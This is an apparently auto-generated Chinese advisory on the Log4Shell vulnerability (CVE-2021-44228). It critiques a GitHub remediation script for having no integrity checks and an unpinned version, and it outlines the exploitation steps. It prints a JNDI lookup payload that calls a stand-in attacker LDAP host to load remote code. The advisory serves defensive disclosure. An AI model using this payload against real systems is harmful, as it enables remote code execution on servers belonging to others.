## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2021-44228（Log4Shell）是Apache Log4j2中的一个严重漏洞，允许未经身份验证的远程代码执行。攻击者可以构造特殊的日志消息，其中包含JNDI查找，指向恶意LDAP或其他JNDI服务。当Log4j2处理这些日志消息时，它会尝试从攻击者控制的服务器下载并执行任意代码。 

提供的脚本 `log4j_remediation` 试图通过下载并替换Log4j2库文件来进行修复，但是从修复的角度来看,这个脚本存在严重的投毒风险，因为：

1. **URL 的变量名不规范**：`LOG4J_DOWNLOAD_URL` 变量中的 `2.x.y` 存在被攻击者修改的风险，攻击者可以劫持链接，使用恶意的Log4j2 jar 包，造成二次污染。
2. **覆盖现有的 Log4j JAR 文件**:  脚本直接复制下载的新 JAR 文件到应用程序目录，这可能会破坏应用程序的依赖关系，尤其是在不同版本的 Log4j 之间存在不兼容的情况下。
3. **未进行校验**:  脚本没有对下载的压缩包或 JAR 文件进行任何完整性校验（如哈希校验），无法确保下载的文件没有被篡改。
4. **依赖外部源**: 脚本依赖于外部 Apache 官方服务器下载 Log4j，如果该服务器被攻陷，则存在极高的投毒风险。
5. **版本不确定**: 脚本中的版本号 `2.x.y` 是一个占位符，这意味着脚本实际上没有指定要下载的具体 Log4j 版本，可能导致下载到不安全或不兼容的版本。


 **利用方式：** 

1.  攻击者找到任何会记录用户可控输入的Log4j2应用程序。
2.  攻击者在输入中插入恶意的JNDI查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  当Log4j2记录包含此字符串的日志消息时，它会向`attacker.com`发起LDAP请求。
4.  `attacker.com`的LDAP服务器返回一个包含恶意Java类的响应。
5.  Log4j2加载并执行该恶意Java类，从而导致远程代码执行。

根据漏洞库信息，搜索引擎结果以及提供的漏洞利用代码进行综合分析， 漏洞利用的有效性高，投毒风险极高。

**项目地址:** [OtisSymbos/CVE-2021-44228-Log4Shell-](https://github.com/OtisSymbos/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)